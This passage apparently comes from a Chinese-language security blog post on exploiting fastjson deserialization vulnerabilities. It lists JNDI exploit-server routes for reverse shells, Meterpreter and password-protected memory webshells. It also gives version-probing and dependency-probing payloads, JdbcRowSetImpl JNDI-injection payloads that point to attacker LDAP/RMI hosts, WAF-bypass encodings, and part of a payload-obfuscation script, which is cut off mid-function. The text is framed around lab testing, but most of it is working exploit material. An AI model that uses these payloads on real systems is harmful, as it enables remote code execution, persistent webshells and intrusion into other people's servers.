ldap://0.0.0.0:1389/Basic/SpringMemshell

[+] Deserialize Queries: 
ldap://0.0.0.0:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.
ldap://0.0.0.0:1389/Deserialization/URLDNS/[domain]
ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]
ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]
ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported
ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils2/TomcatEcho
ldap://0.0.0.0:1389/Deserialization/C3P0/SpringEcho
ldap://0.0.0.0:1389/Deserialization/Jdk7u21/WeblogicEcho
ldap://0.0.0.0:1389/Deserialization/Jre8u20/TomcatMemshell
ldap://0.0.0.0:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1
ldap://0.0.0.0:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells

[+] TomcatBypass Queries
ldap://0.0.0.0:1389/TomcatBypass/Dnslog/[domain]
ldap://0.0.0.0:1389/TomcatBypass/Command/[cmd]
ldap://0.0.0.0:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]
ldap://0.0.0.0:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported
ldap://0.0.0.0:1389/TomcatBypass/TomcatEcho
ldap://0.0.0.0:1389/TomcatBypass/SpringEcho
ldap://0.0.0.0:1389/TomcatBypass/TomcatMemshell1
ldap://0.0.0.0:1389/TomcatBypass/TomcatMemshell2  ---need extra header [shell: true]
ldap://0.0.0.0:1389/TomcatBypass/TomcatMemshell3  /ateam  pass1024
ldap://0.0.0.0:1389/TomcatBypass/GodzillaMemshell /bteam.ico pass1024
ldap://0.0.0.0:1389/TomcatBypass/SpringMemshell
ldap://0.0.0.0:1389/TomcatBypass/Meterpreter/[ip]/[port]  ---java/meterpreter/reverse_tcp

[+] GroovyBypass Queries
ldap://0.0.0.0:1389/GroovyBypass/Command/[cmd]
ldap://0.0.0.0:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd]

[+] WebsphereBypass Queries
ldap://0.0.0.0:1389/WebsphereBypass/List/file=[file or directory]
ldap://0.0.0.0:1389/WebsphereBypass/Upload/Dnslog/[domain]
ldap://0.0.0.0:1389/WebsphereBypass/Upload/Command/[cmd]
ldap://0.0.0.0:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]
ldap://0.0.0.0:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported
ldap://0.0.0.0:1389/WebsphereBypass/Upload/WebsphereMemshell
ldap://0.0.0.0:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp
</code></pre>
<h4 id="JNDIBypass"><a href="#JNDIBypass" class="headerlink" title="JNDIBypass"></a><strong>JNDIBypass</strong></h4><p>该工具来自<a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/blob/65e845a989fd2907751310b9bbc74ab589b2e96a/1245-jdk8u342/write-up.md">FastJsonParty/1245-jdk8u342</a>，其中提供了该<code>JNDIBypass</code>工具。该工具是<code>fastjson</code>原生反序列化中<code>JNDI</code>利用工具，支持内存命令执行、冰蝎3内存马等利用方法:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516192516896.png"></p>
<p>其中命令执行内存马使用方法为:<code>ip:port/shell?cmd=whoami</code>。冰蝎v3内存马连接地址: <code>ip:port/behinder</code>，连接密码为<code>rebeyond</code>。</p>
<h4 id="Java-memshell-generator-JMG"><a href="#Java-memshell-generator-JMG" class="headerlink" title="Java-memshell-generator(JMG)"></a><a target="_blank" rel="noopener" href="https://github.com/pen4uin/java-memshell-generator">Java-memshell-generator(JMG)</a></h4><p><code>Java-memshell-generator</code>是一款可以自定义生成内存马载荷的工具又名<code>JMG</code>，可以通过该工具生成各种类型的内存马载荷，在<code>fastjson</code>漏洞利用中根据不用利用类型可以很方便生成多种输出格式的内存马载荷:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240818214006317.png"></p>
<h2 id="0x03-FastJson-Payload"><a href="#0x03-FastJson-Payload" class="headerlink" title="0x03 FastJson Payload"></a>0x03 FastJson Payload</h2><h3 id="0x03-1-检测是否为FastJson"><a href="#0x03-1-检测是否为FastJson" class="headerlink" title="0x03.1 检测是否为FastJson"></a>0x03.1 检测是否为FastJson</h3><p>这里主要是判断目标是否使用了<code>fastjson</code>还是其他类型的解析库，主要是利用fastjson的一些特性进行判断，假设请求JSON如下:</p>
<pre><code class="line-numbers language-json">{
    "age":20,
    "name":"Bob"
}
</code></pre>
<h4 id="根据报错信息判断"><a href="#根据报错信息判断" class="headerlink" title="根据报错信息判断"></a><strong>根据报错信息判断</strong></h4><pre><code class="line-numbers language-json">// 如果目标服务器存在报错信息，可以破坏JSON结构，触发报错
{"age":20,"name":"Bob"
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240426161520794.png"></p>
<pre><code class="line-numbers language-json">// 利用@type功能引发错误,可检测autotype是否开启
{"@type":"whatever"}
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240525154046101.png"></p>
<h4 id="根据解析变化判断"><a href="#根据解析变化判断" class="headerlink" title="根据解析变化判断"></a>根据解析变化判断</h4><pre><code class="line-numbers language-json">{"a":new a(1),"b":x'11',/*\*\/"c":Set[{}{}],"d":"\u0000\x00"}

{"ext":"blue","name":{"$ref":"$.ext"}}
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427171251495.png"></p>
<p>在靶场中只观察到<code>Set[{}{}]</code>可以解析成功：</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427171339452.png"></p>
<h4 id="根据带外信息判断"><a href="#根据带外信息判断" class="headerlink" title="根据带外信息判断"></a><strong>根据带外信息判断</strong></h4><pre><code class="line-numbers language-json">// 不出网时可以利用网络请求是否延时进行判断
// java.net.URL
{"@type":"java.net.URL","val":"http://dnslog"}
{{"@type":"java.net.URL","val":"http://dnslog"}:0
Set[{"@type":"java.net.URL","val":"http://dnslog"}]
Set[{"@type":"java.net.URL","val":"http://dnslog"}
{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}

// java.net.InetAddress
{"@type":"java.net.InetAddress","val":"x.x.x.x"}

// java.net.Inet[4|6]Address (以下载荷在1.2.83版本中也可以使用，一般使用该方法探测是否为fastjson)
{"@type":"java.net.Inet4Address","val":"x.x.x.x"}
{"@type":"java.net.Inet6Address","val":"x.x.x.x"}
{{"@type":"java.net.URL","val":"http://dnslog"}:"x"}
{"zero":{"@type":"java.net.Inet4Address","val":"x.x.x.x"}}

// java.net.InetSocketAddress
{"@type":"java.net.InetSocketAddress",{"address":,"val":"x.x.x"}}
{"@type":"java.net.InetSocketAddress"{"address":,"val":"xxx.dns"}, "port":80}
</code></pre>
<p>在进行Payload测试时，一般可以将Payload插入到值中:</p>
<pre><code class="line-numbers language-json">{"age":25,"name":{"@type":"java.net.InetSocketAddress"{"address":,"val":"x.x.x"}}}
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240426174659240.png"></p>
<h4 id="区别jackson和fastjson"><a href="#区别jackson和fastjson" class="headerlink" title="区别jackson和fastjson"></a><strong>区别jackson和fastjson</strong></h4><pre><code>// 多余的类成员: 添加一个键值 test，jackson会报错，fastjson不会
{"age":20,"name":"Bob","test":1}

// jackson 不支持单引号作为界定符
{"age":20,'name':'Bob'}

// jackson 可以使用注释符，fastjson 会报错
{
    "age":20,
    "name":'Bob'
}/*#aaaa

// jackson 会丢失精度
{
    "age":20.111111111111111111111111111,
    "name":'Bob'
}
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240426161630309.png"></p>
<h3 id="0x03-2-FastJson版本探测"><a href="#0x03-2-FastJson版本探测" class="headerlink" title="0x03.2 FastJson版本探测"></a>0x03.2 FastJson版本探测</h3><h4 id="报错信息判断"><a href="#报错信息判断" class="headerlink" title="报错信息判断"></a>报错信息判断</h4><pre><code class="line-numbers language-json">// 1
{"@type": "java.lang.AutoCloseable"

// 2
["test":1]
    
// 3
a 
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240426182956211.png"></p>
<p>1.2.77~1.2.80的版本信息显示会有误，都是返回1.2.76，实际靶场环境是1.2.80:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240426182934272.png"></p>
<h4 id="是否报错判断"><a href="#是否报错判断" class="headerlink" title="是否报错判断"></a>是否报错判断</h4><pre><code class="line-numbers language-json">//Payload1: 不报错:1.2.24 / 1.2.83，报错: 1.2.25-1.2.80
{"zero":{"@type":"java.lang.Exception","@type":"org.XxException"}}

//Payload2:  不报错:1.2.24-1.2.68，  报错: 1.2.70-1.2.83
{"zero":{"@type":"java.lang.AutoCloseable","@type":"java.io.ByteArrayOutputStream"}}

//Payload3:  不报错:1.2.24-1.2.47,   报错: 1.2.48-1.2.83
{"a": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"}, "b": {"@type": "com.sun.rowset.JdbcRowSetImpl"}}

//Payload4:不报错:1.2.24, 报错: 1.2.25-1.2.83
{"zero": {"@type": "com.sun.rowset.JdbcRowSetImpl"}}
</code></pre>
<p>靶场环境中有一个环境无法根据报错信息得到版本，那么根据不报错Payload进行判断，先使用<code>Payload1</code>，发现没报错，那么可能是<code>1.2.24</code>或<code>1.2.83</code>:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427162030667.png"></p>
<p>再使用<code>Payload2</code>进行测试，还是没有报错，那么可能就是<code>1.2.24</code>:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427162125919.png"></p>
<p>使用<code>Payload4</code>进行测试，发现依然不报错，那么可以初步确定该环境为<code>1.2.24</code>，从靶场中提取出jar包，发现确实是<code>1.2.24</code>：</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427162407866.png"></p>
<h4 id="带外信息判断"><a href="#带外信息判断" class="headerlink" title="带外信息判断"></a><strong>带外信息判断</strong></h4><p>这些方法可能有一些不是很准确，但是应该也可以结合起来判断目标版本。测试代码如下:</p>
<pre><code class="line-numbers language-json">import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

interface Animal {
    String makeSound();
}

class Dog implements Animal {
    @Override
    public String makeSound() {
        return "Woof!";
    }
}

class Cat implements Animal {
    @Override
    public String makeSound() {
        return "Meow!";
    }
}

public class Main {
    public static void main(String[] args) {
        String json = "{\n" +
                "\t\"age\":25,\n" +
                "\t\"name\":{\"@type\":\"java.net.InetAddress\",\"val\":\"lz9u.callback.red\"}\n" +
                "}";

        // 不使用 autotype 功能，将会抛出异常
        try {
            Animal animal = JSON.parseObject(json, Animal.class);
            System.out.println("Sound: " + animal.makeSound());
        } catch (com.alibaba.fastjson.JSONException e) {
            System.out.println("Exception caught: " + e.getMessage());
        }
    }
}
</code></pre>
<p>然后通过修改fastjson依赖版本的方式来测试，测试的payload列表如下:</p>
<pre><code class="line-numbers language-json">// 1.1.16 &lt;= fastjson &lt;=1.2.24 
// (fastjson 1.2.25:autoType is not support. com.sun.rowset.JdbcRowSetImpl)
{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x.x.x.x","autoCommit":true}}

// fastjson &gt;= 1.2.37 (测试成功)
{{"@type":"java.net.URL","val":"http://dnslog"}:"aaa"}

// fastjson &lt; 1.2.48 (测试成功)
{"@type":"java.net.InetAddress","val":"x.x.x.x"}

// fastjson &lt;= 1.2.68 {{"@type":"java.net.url","val":"http: dnslog"}:"aaa"} set[{"@type":"java.net.url","val":"http: dnslog"}] dnslog"} {"@type":"com.alibaba.fastjson.jsonobject", {"@type": "java.net.url", "val":"http: dnslog"}}""} dnslog"}:0 {"@type":"java.net.inetsocketaddress"{"address":,"val":"dnslog"}} {"@type":"java.net.inetsocketaddress"{"address":,"val":"dnslog"}} 精确版本探测(kcon2022-hacking-json.pdf) fastjson 1.2.47 版本探测 [ {"@type": "java.lang.class","val": "java.io.bytearrayoutputstream"}, "java.net.inetsocketaddress"{"address":,"val": "aaa.xxxx.ceye.io"}} ] "java.lang.autocloseable","@type": "bbb.n41tma.ceye.io"}} 1.2.80 收到一个dns请求，1.2.83 收到两个dns请求 "java.lang.exception","@type": "com.alibaba.fastjson.jsonexception","x": "first.dnslog.com"}}}, "com.alibaba.fastjson.jsonexception","message": "ddd.4fhgzj.dnslog.cn"}}} &lt; code&gt;<!--=--></code></pre>
<h4 id="请求延迟判断"><a href="#请求延迟判断" class="headerlink" title="请求延迟判断"></a><strong>请求延迟判断</strong></h4><p>利用<code>fastjson</code>解析地址时请求本机已开放端口不延时，请求不开放的端口则延时的特性判断:</p>
<pre><code class="line-numbers language-json">// 1.1.16&lt;= fastjson &lt;=1.2.11，第一个响应时间很长，第二个较短，可判断版本范围
{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://1.2.3.4/POC", "autoCommit":true}}""}

{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1/POC", "autoCommit":true}}""}

// 1.1.15 &lt;= fastjson &lt;=1.2.24(1.2.25报错autoType is not support: x.x.JdbcRowSetImpl)
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/badClassName", "autoCommit":true}

// 1.1.16&lt;= fastjson &lt;=1.2.24,第一个响应时间很长，第二个较短，可判断版本范围
{"username":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://1.2.3.4/POC","autoCommit":true}}

{"username":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1/POC","autoCommit":true}}

//  1.2.9&lt;= fastjson &lt;= 1.2.47
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://localhost:808/badNameClass",
        "autoCommit":true
    }
}

// 1.2.9&lt;= fastjson &lt;=1.2.11,第一个响应时间很长，第二个较短，可判断版本范围
{"@type":"com.alibaba.fastjson.JSONObject","a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://1.2.3.4/POC","autoCommit":true}}

{"@type":"com.alibaba.fastjson.JSONObject","a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1/POC","autoCommit":true}}

// 1.2.4&lt;= fastjson &lt;=1.2.47,第一个响应时间很长，第二个较短，可判断版本范围
{"name":{"\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073","\u0076\u0061\u006c":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"},"x":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"ldap://1.2.3.4/test111","autoCommit":true}}

{"name":{"\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073","\u0076\u0061\u006c":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"},"x":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"ldap://127.0.0.1/test111","autoCommit":true}}

// 1.2.28&lt;= fastjson &lt;=1.2.47,第一个响应时间很长，第二个较短，可判断版本范围
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://1.2.3.4/POC","autoCommit":true}}

{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1/POC","autoCommit":true}}

// 通用payload,可用于parseObject的场景
{"@type":"com.alibaba.fastjson.JSONObject",{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://localhost:8088/badNameClass",
        "autoCommit":true
    }
}}""}

{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:8088/badClassName", "autoCommit":true}}""}

// Fastjson 1.2.36 - 1.2.62
{
    "regex":{
        "$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"
    },
    "blue":"aaaaaaaaaaaa!"
}
</code></pre>
<h3 id="0x03-3-依赖环境探测"><a href="#0x03-3-依赖环境探测" class="headerlink" title="0x03.3 依赖环境探测"></a>0x03.3 依赖环境探测</h3><p>可以通过特定Payload探测目标依赖（gadget）环境，然后根据环境确定POC。主要可以探测以下常见依赖项是否存在:</p>
<pre><code class="line-numbers language-json">// jndi (需要出网)
com.sun.rowset.JdbcRowSetImpl                             [常用]
org.apache.shiro.jndi.JndiObjectFactory                   [shiro]
org.apache.shiro.realm.jndi.JndiRealmFactory              [shiro]
com.mchange.v2.c3p0.JndiRefForwardingDataSource           [c3p0]
com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource
org.apache.commons.configuration.JNDIConfiguration  // cmmons-configuration JNDI注入      
org.apache.commons.configuration2.JNDIConfiguration // cmmons-configuration JNDI注入     
org.apache.ibatis.datasource.jndi.JndiDataSourceFactory
org.apache.commons.proxy.provider.remoting.SessionBeanProvider
com.caucho.config.types.ResourceRef
org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup
com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig
br.com.anteros.dbcp.AnterosDBCPConfig
org.apache.shiro.realm.jndi.JndiRealmFactory
org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig
org.apache.xbean.propertyeditor.JndiConverter
oracle.jdbc.connector.OracleManagedConnectionFactory
org.apache.cocoon.components.slide.impl.JMSContentInterceptor
org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory
org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory
...

// 字节码&amp;命令执行
org.apache.ibatis.type.Alias  // Mybatis + BCEL方式执行字节码
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl // TemplatesImpl
org.apache.tomcat.dbcp.dbcp.BasicDataSource  // tomcat-dbcp-7+BCEL 执行字节码
org.apache.tomcat.dbcp.dbcp2.BasicDataSource // tomcat-dbcp-8及以后+BCEL 执行字节码
com.sun.org.apache.bcel.internal.util.ClassLoader // Apache Commons BCEL
com.mchange.v2.c3p0.WrapperConnectionPoolDataSource // C3P0二次反序列化 Hex字节码加载

// Tomcat 8+ (Tomcat 8.0.x、&lt;=8.5.78、&lt;=9.0.62) 高版本JDK时JNDI命令执行
javax.el.ELProcessor

// Groovy - 1.2.80   高版本JDK时groovy命令执行
groovy.lang.GroovyShell
groovy.lang.GroovyClassLoader
org.apache.naming.factory.BeanFactory
org.yaml.snakeyaml.Yaml
com.thoughtworks.xstream.XStream
org.xmlpull.v1.XmlPullParserException
org.xmlpull.mxp1.MXParser
org.mvel2.sh.ShellSession
com.sun.glass.utils.NativeLibLoader
// 探测其他类方法是否存在
javax.management.loading.MLet
...

// 文件读写
org.apache.commons.io.file.Counters  // commons-io-2.7+
org.apache.commons.io.Charsets       // &lt;= commons-io-2.6,commons-io-2.7移除
org.aspectj.ajde.Ajde                // aspectjtools 读文件
...

// 反序列化利用链
com.mysql.jdbc.Buffer  // mysql-jdbc-5 mysql-JDBC反序列化
com.mysql.cj.protocol.AuthenticationProvider // mysql-connect-8
com.mysql.cj.api.authentication.AuthenticationProvider  // mysql-connect-6
org.codehaus.groovy.control.CompilerConfiguration // groovy 远程类加载
// JDBC
org.h2.Driver
org.postgresql.Driver
com.mysql.jdbc.Driver
com.mysql.cj.jdbc.Driver
org.h2.jdbcx.JdbcDataSource
com.mysql.fabric.jdbc.FabricMySQLDriver
oracle.jdbc.driver.OracleDriver
org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory
org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory
org.apache.commons.dbcp.BasicDataSourceFactory
org.apache.commons.pool.KeyedObjectPoolFactory
org.apache.commons.dbcp2.BasicDataSourceFactory
org.apache.commons.pool2.PooledObjectFactory
org.apache.tomcat.jdbc.pool.DataSourceFactory
org.apache.juli.logging.LogFactory
com.alibaba.druid.pool.DruidDataSourceFactory
//WebSphere加载jar RCE
com.ibm.ws.client.applicationclient.ClientJ2CCFFactory
com.ibm.ws.webservices.engine.client.ServiceFactory
...

// XXE和文件写入
org.apache.catalina.UserDatabase
org.apache.catalina.users.MemoryUserDatabaseFactory

// 辅助依赖环境判断
org.springframework.web.bind.annotation.RequestMapping  //SpringBoot 回显、内存马
org.apache.catalina.startup.Tomcat  // Tomcat 内存马
com.mchange.v2.c3p0.DataSources  // C3P0 依赖


// JDK版本识别
sun.nio.cs.GBK  // JDK8
java.util.Spliterator  // JDK 8
java.util.concurrent.CompletableFuture  // JDK 8
java.util.Optional  // JDK 8
java.util.stream.Stream  // JDK 8
java.time.LocalDate  // JDK 8
java.time.LocalTime  // JDK 8
java.time.LocalDateTime  // JDK 8
java.time.Duration  // JDK 8
java.time.Period  // JDK 8
java.time.Instant  // JDK 8
java.util.function.Function  // JDK 8
java.util.function.Predicate  // JDK 8
java.util.function.Supplier  // JDK 8
java.util.function.Consumer  // JDK 8
java.time.format.DateTimeFormatter  // JDK 8

java.lang.Module  // JDK 9
java.util.concurrent.Flow  // JDK 9
java.lang.invoke.VarHandle  // JDK 9
java.util.OptionalInt  // JDK 9
java.util.OptionalLong  // JDK 9
java.util.OptionalDouble  // JDK 9
java.net.http.HttpClient  // JDK 9 (初步引入，JDK 11 中稳定)
java.lang.StackWalker  // JDK 9
java.nio.file.Files  // JDK 9 (新方法)

java.net.http.HttpClient  // JDK 11
java.lang.invoke.ConstantBootstraps  // JDK 11
java.util.concurrent.Flow  // JDK 11 (完善)
java.nio.file.Files  // JDK 11 (新方法)

java.lang.Record  // JDK 14
java.lang.constant.Constable  // JDK 14

java.net.http.HttpRequest  // JDK 15 (新方法)
java.net.http.HttpResponse  // JDK 15 (新方法)

java.util.random.RandomGenerator  // JDK 16

java.net.spi  // JDK 17
java.util.random.RandomGeneratorFactory  // JDK 17
...
</code></pre>
<h4 id="通过是否返回实例判断"><a href="#通过是否返回实例判断" class="headerlink" title="通过是否返回实例判断"></a>通过是否返回实例判断</h4><p>这个方法是<code>1.2.47</code>及之前版本添加类缓存的一个利用方式，如果系统存在这个类，会返回一个类实例，如果不存在会返回 null:</p>
<pre><code class="line-numbers language-json">{
  "z": {
    "@type": "java.lang.Class",
    "val": "org.springframework.web.bind.annotation.RequestMapping"
  }
}
</code></pre>
<p><code>org.springframework.web.bind.annotation.RequestMapping</code>类存在时：</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427234745974.png"></p>
<p>不存在类的情况:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427234835868.png"></p>
<h4 id="通过类转换异常判断"><a href="#通过类转换异常判断" class="headerlink" title="通过类转换异常判断"></a>通过类转换异常判断</h4><p>通过使用 <code>java.lang.Character</code>对类进行转换，类存在时转换将抛出异常:</p>
<pre><code class="line-numbers language-json">{
  "x": {
    "@type": "java.lang.Character"{
  "@type": "java.lang.Class",
  "val": "com.mysql.jdbc.Driver"
}}

{"@type": "java.lang.Character"{"@type": "java.lang.Class","val": "com.mysql.jdbc.Driver"}
</code></pre>
<p><code>org.apache.catalina.startup.Tomcat</code>类存在时，转换失败将抛出异常:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427234924124.png"></p>
<p><code>com.mysql.jdbc.Driver</code>类不存在时返回空:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240427235139838.png"></p>
<h4 id="通过带外信息判断"><a href="#通过带外信息判断" class="headerlink" title="通过带外信息判断"></a>通过带外信息判断</h4><p>通过使用 带外请求来探测依赖库，当存在依赖时<code>DNSLOG</code>中会显示类信息:</p>
<pre><code class="line-numbers language-json">{"@type":"java.net.Inet4Address",
   "val":{"@type":"java.lang.String"
{"@type":"java.util.Locale",
   "val":{"@type":"com.alibaba.fastjson.JSONObject",{
   "@type": "java.lang.String""@type":"java.util.Locale",
   "language":{"@type":"java.lang.String"
{1:{"@type":"要探测的类"}},
"country":"DNSLOG"
}}}}}}
</code></pre>
<p>在靶机环境中未能实现<code>DNSLOG</code>检测，因为<code>DNS</code>请求没法支持<code>{}</code>符号，会抛出异常（需要对方为<code>mac</code>环境且<code>dnslog</code>平台支持特殊符号）,但是也可以根据异常检测到存在类(存在类时才会发起<code>DNS</code>解析，这时候就抛出了<code>deserialize inet adress error</code>异常):</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240428000716121.png"></p>
<h3 id="0x03-4-WAF绕过"><a href="#0x03-4-WAF绕过" class="headerlink" title="0x03.4 WAF绕过"></a>0x03.4 WAF绕过</h3><p><strong>1.Unicode与Hex编码</strong></p>
<pre><code class="line-numbers language-json">{"\x40\u0074\u0079\u0070\u0065":"\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c","dataSourceName":"rmi://127.0.0.1:1099/Exploit", "autoCommit":true}

{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"$%7bjndi:ldap://1.1.1.1:1389/EvilObject%7d","autoCommit": true}}
</code></pre>
<p><strong>2.添加多个逗号</strong></p>
<pre><code class="line-numbers language-json">{,,,,,,"@type":"com.sun.rowset.JdbcRowSetImpl",,,,,,"dataSourceName":"rmi://127.0.0.1:1099/Exploit",,,,,, "autoCommit":true         }
</code></pre>
<p><strong>3.自动处理脚本</strong></p>
<pre><code class="line-numbers language-python">// https://medium.com/@knownsec404team/fastjson-deserialization-vulnerability-history-5206714ceed1

#!usr/bin/env python  
# -*- coding:utf-8 -*-
"""
@author: longofo
@file: fastjson_fuzz.py
@time: 2020/05/07
"""
import json
from json import JSONDecodeError
class FastJsonPayload:
    def __init__(self, base_payload):
        try:
            json.loads(base_payload)
        except JSONDecodeError as ex:
            raise ex
        self.base_payload = base_payload
    def gen_common(self, payload, func):
        tmp_payload = json.loads(payload)
        dct_objs = [tmp_payload]
        while len(dct_objs) &gt; 0:
            tmp_objs = []
            for dct_obj in dct_objs:
                for key in dct_obj:
                    if key == "@type":
                        dct_obj[key] = func(dct_obj[key])
                    if type(dct_obj[key]) == dict:
                        tmp_objs.append(dct_obj[key])
            dct_objs = tmp_objs
        return json.dumps(tmp_payload)
    # Increase the value of @type by the beginning of L, the end of ;
    def gen_payload1(self, payload: str):
        return self.gen_common(payload, lambda v: "L" + v + ";")
    # Increase the value of @type by the beginning of LL, the end of ;;
    def gen_payload2(self, payload: str):
        return self.gen_common(payload, lambda v: "LL" + v + ";;")
    # Carry on the value of @type \u format
    def gen_payload3(self, payload: str):
        return self.gen_common(payload,
                               lambda v: ''.join('\\u{:04x}'.format(c) for c in v.encode())).replace("\\\\", "\\")
    # Carry on the value of @type \x format
    def gen_payload4(self, payload: str):
        return self.gen_common(payload,
